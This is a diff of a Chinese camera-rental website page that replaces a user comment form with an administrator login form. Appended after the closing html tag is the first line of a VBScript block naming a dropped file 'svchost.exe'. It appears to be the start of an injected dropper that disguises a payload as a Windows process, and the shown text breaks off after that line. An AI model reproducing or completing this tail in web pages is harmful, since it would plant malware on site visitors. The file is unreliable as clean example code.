@@ -1,188 +1,99 @@
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>
-<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
-<!DOCTYPE html>
+<!doctype html>
 <html>
 	<head>
-		<meta charset="utf-8">
-		<title>评论操作</title>
-		<link rel="stylesheet" type="text/css" href="Css/identify.css" />
-		<link rel="stylesheet" type="text/css" href="Css/layout.css" />
-		<link rel="stylesheet" type="text/css" href="Css/account.css" />
-		<link rel="stylesheet" type="text/css" href="Css/style.css" />
-		<link rel="stylesheet" type="text/css" href="Css/control_index.css" />
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+		<title>爱租相机网</title>
+		<meta name="keywords" content="深圳合众艾特" />
+		<meta name="description" content="深圳合众艾特" />
+		<link href="Css/layout.css" rel="stylesheet" type="text/css">
+		<link href="Css/login.css" rel="stylesheet" type="text/css">
 		<script type="text/javascript" src="Js/jquery-1.7.2.min.js"></script>
-		<script type="text/javascript" src="Js/layer/layer.js"></script>
-		<script type="text/javascript" src="Js/haidao.offcial.general.js"></script>
-		<script type="text/javascript" src="Js/select.js"></script>
-		<script type="text/javascript" src="Js/haidao.validate.js"></script>
+		<script type="text/javascript" src="Js/js.js"></script>
 	</head>
-
-	<body>
-		<div class="view-topbar">
-			<div class="topbar-console">
-				<div class="tobar-head fl">
-					<a href="#" class="topbar-logo fl">
-					<span><img src="Images/logo.png" width="20" height="20"/></span>
+	<style>
+		.ibar {display: none;}
+	</style>
+	<body class="login-bg">
+		<div class="main">
+			<!--登录-->
+			<div class="login-dom login-max">
+				<div class="logo text-center">
+					<a href="#">
+					<img src="Images/logo.png" width="180px" height="180px">
 					</a>
-					<a href="index.html" class="topbar-home-link topbar-btn text-center fl"><span>主页</span></a>
 				</div>
-			</div>
-			<div class="topbar-info">
-				<ul class="fr">
-					<li class="fl dropdown topbar-notice topbar-btn">
-					<a href="#" class="dropdown-toggle">
-					<span class="icon-notice"></span>
-					<span class="topbar-num have">0</span>
-					<!--have表示有消息，没有消息去掉have-->
-					</a>
-
-					<li class="fl topbar-info-item">
-					<div class="dropdown">
-						<a href="usercentral.jsp" class="topbar-btn">
-						<span class="fl text-normal">${user.uname}</span>
-						<span class="icon-arrow-down"></span>
-						</a>
-						<ul class="dropdown-menu">
-							<li><a href="login.html">退出</a></li>
-						</ul>
-					</div>
-					</li>
-				</ul>
-			</div>
-		</div>
-		<div class="view-body">
-			<div class="view-sidebar">
-				<div class="view-sidebar">
-					<div class="sidebar-content">
-						<!--一级菜单循环从这里开始 ，动态循环显示一级菜单-->
-						<div class="sidebar-nav">
-							<div class="sidebar-title">
-								<a href="#">
-									<span class="icon"><b class="fl icon-arrow-down"></b></span>
-									<span class="text-normal">菜单</span>
-								</a>
+				<div class="login container " id="login">
+					<p class="text-big text-center logo-color">
+						邹东平开发组
+					</p>
+					<p class=" text-center margin-small-top logo-color text-small">
+						爱租相机网
+					</p>
+					<form class="login-form" action="managerLogin" method="post" autocomplete="off">
+						<div class="login-box border text-small" id="box">
+							<div class="name border-bottom">
+								<input type="text" placeholder="管理员账号" id="managername" name="mname" datatype="*" nullmsg="请填写帐号信息">
 							</div>
-							<ul class="sidebar-trans">
-								<!--二级菜单循环从这里开始 ，动态循环显示二级菜单-->
-								<li>
-									<a href="#">
-										<b class="sidebar-icon"><img src="Images/icon_author.png" width="16" height="16" /></b>
-										<span class="text-normal">修改个人资料</span>
-									</a>
-								</li>
-								<li>
-									<a href="#">
-										<b class="sidebar-icon"><img src="Images/icon_author.png" width="16" height="16" /></b>
-										<span class="text-normal">收货地址</span>
-									</a>
-								</li>
-								<li>
-									<a href="findorder">
-										<b class="sidebar-icon"><img src="Images/icon_author.png" width="16" height="16" /></b>
-										<span class="text-normal">我的订单</span>
-									</a>
-								</li>
-								<li>
-									<a href="#">
-										<b class="sidebar-icon"><img src="Images/icon_author.png" width="16" height="16" /></b>
-										<span class="text-normal">我的合同</span>
-									</a>
-								</li>
-								<li>
-									<a href="findusercomment">
-										<b class="sidebar-icon"><img src="Images/icon_author.png" width="16" height="16" /></b>
-										<span class="text-normal">我的评论</span>
-									</a>
-								</li>
-								<li>
-									<a href="updatePwd.html">
-										<b class="sidebar-icon"><img src="Images/icon_author.png" width="16" height="16" /></b>
-										<span class="text-normal">修改密码</span>
-									</a>
-								</li>
-								<li>
-									<a href="#">
-										<b class="sidebar-icon"><img src="Images/icon_author.png" width="16" height="16" /></b>
-										<span class="text-normal">绑定银行账户</span>
-									</a>
-								</li>
-								<li>
-									<a href="#">
-										<b class="sidebar-icon"><img src="Images/icon_author.png" width="16" height="16" /></b>
-										<span class="text-normal">查询账单</span>
-									</a>
-								</li>
-
-							</ul>
-							<!--一级菜单循环从这里结束 ，动态循环显示一级菜单-->
-
-						</div>
-			<div class="view-product">
-				<div class="company_identify">
-					<div class="manage-head">
-						<h6 class="padding-left manage-head-con">评论商品</h6>
-					</div>
-
-					<form name="setp0" action="addcommentservlet" method="post" autocomplete="off">
-						<div class="basic-info-detail clearfix">
-							<div class="unit-style padding-big-lr clearfix">
-								<h4 class="real-name-head margin-large-top">填写评论</h4>
-								<div class="real-name-con height-main margin-top-25">
-									<p class="content-left-zoon">
-										具体描述
-									</p>
-									<div class="content-right-zoon">
-										<input class="width-main input" type="text" name="content" datatype="*" value="">
-									</div>
-								</div>
-
-								<div class="real-name-con height-main margin-top-25">
-									<p class="content-left-zoon">
-										评论等级
-									</p>
-									<div class="content-right-zoon">
-										<select name="level">
-											<option>优</option>
-											<option>良</option>
-											<option>差</option>
-										</select>
-									</div>
-								</div>
-								<p>&nbsp;</p>
+							<div class="pwd">
+								<input type="password" placeholder="管理员密码" datatype="*" id="password" name="pwd" nullmsg="请填写帐号密码">
 							</div>
 						</div>
-						<div class="unit-style padding-large-tb clearfix">
-							<div class="margin-large-top padding-left text-left content-right-zoon">
-								<input type="submit" value="确认" class="submit fl">
-							</div>
-						</div>
+						<input type="hidden" name="formhash" value="5abb5d21"/>
+						<input type="submit" class="btn text-center login-btn" value="立即登录">
 					</form>
+					<div class="forget">
+						<a href="repassword.html" class="forget-pwd text-small fl">忘记登录密码？</a><a href="register.html" class="forget-new text-small fr" id="forget-new">创建一个新账号</a>
+					</div>
+				</div>
+			</div>
+
+			<div class="footer text-center text-small ie">
+				Copyright 2017 邹东平开发团队 版权所有 <a href="#" target="_blank">滇ICP备13005806号</a>
+				<span class="margin-left margin-right">|</span>
+				<script src="#" language="JavaScript"></script>
+			</div>
+			<div class="popupDom">
+				<div class="popup text-default">
 				</div>
 			</div>
 		</div>
-
-		<script>
-			console.log(window.location.href);
-			var url = window.location.search;
-			var ary = url.split("&");
-			var obj = {};
-			for(
-					var i = 0 ; i < ary.length; i++){obj[ary[i].split("=")[0]] =  ary[i].split("=")[1]
-			}
-			$(".fi").click(function(){
-				$.get("/AddCommentServlet.java",obj);
-			});
-			$(".sidebar-title").live('click', function() {
-				if ($(this).parent(".sidebar-nav").hasClass("sidebar-nav-fold")) {
-					$(this).next().slideDown(200);
-					$(this).parent(".sidebar-nav").removeClass("sidebar-nav-fold");
-				} else {
-					$(this).next().slideUp(200);
-					$(this).parent(".sidebar-nav").addClass("sidebar-nav-fold");
-				}
-			});
-		</script>
 	</body>
+	<script type="text/javascript" src="Js/Validform_v5.3.2_min.js"></script>
+	<script type="text/javascript">
+		function popup_msg(msg) {
+			$(".popup").html("" + msg + "");
+			$(".popupDom").animate({
+				"top": "0px"
+			}, 400);
+			setTimeout(function() {
+				$(".popupDom").animate({
+					"top": "-40px"
+				}, 400);
+			}, 2000);
+		}
+
+		/*动画（注册）*/
+		$(document).ready(function(e) {
+			// $("input[name=username]").focus();
+			// $('.login-form').Validform({
+			// 	ajaxPost: true,
+			// 	tiptype: function(msg) {
+			// 		if (msg) popup_msg('' + msg + '');
+			// 	},
+			// 	callback: function(ret) {
+			// 		popup_msg('' + ret.info + '');
+			// 		if (ret.status == 1) {
+			// 			if (ret.uc_user_synlogin) {
+			// 				$("body").append(ret.uc_user_synlogin);
+			// 			}
+			// 			setTimeout("window.location='" + ret.url + "'", 2000);
+			// 		}
+			// 	}
+			// })
+
+		});
+	</script>
 
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
